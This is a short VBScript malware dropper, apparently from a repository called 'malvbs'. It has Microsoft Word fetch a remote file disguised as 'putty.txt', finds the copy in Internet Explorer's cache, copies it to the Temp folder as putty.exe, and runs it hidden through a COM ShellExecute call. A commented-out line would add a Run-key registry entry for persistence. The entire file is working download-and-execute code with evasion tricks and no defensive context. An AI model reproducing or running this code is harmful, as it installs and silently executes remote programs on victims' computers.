' Created by NukeDuk

' Testy IE
'Set IE = CreateObject("InternetExplorer.Application")
'IE.Visible = False
'IE.Navigate "https://image.ceneostatic.pl/data/products/49235798/i-lego-worlds-gra-pc.jpg"

Set oShell = CreateObject("WScript.Shell")
HomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")

Set WordApp = CreateObject("word.application")
Set WordDoc = WordApp.Documents.Open("https://github.com/nukeduk/malvbs/blob/master/putty.txt?raw=true")
WordApp.Application.Visible = False
WordDoc.Close
WordApp.Quit
Set WordDoc = Nothing
Set WordApp = Nothing

Set fso = CreateObject("Scripting.FileSystemObject")
finder fso.GetFolder(HomeFolder+"\AppData\Local\Microsoft\Windows\INetCache\IE")

Sub finder(fldr)
  For Each f In fldr.Files
    If LCase(f.Name) = "putty[1].txt" Then
      f.copy HomeFolder+"\AppData\Local\Temp\putty.exe"
      Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
      obj.Document.Application.ShellExecute "putty.exe",Null,HomeFolder+"\AppData\Local\Temp",Null,0
    End If
  Next

  For Each sf In fldr.SubFolders
    finder sf
  Next
End Sub

'Set WshShell = CreateObject("WScript.Shell")
'WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\malw", "tujestmalware", "REG_SZ"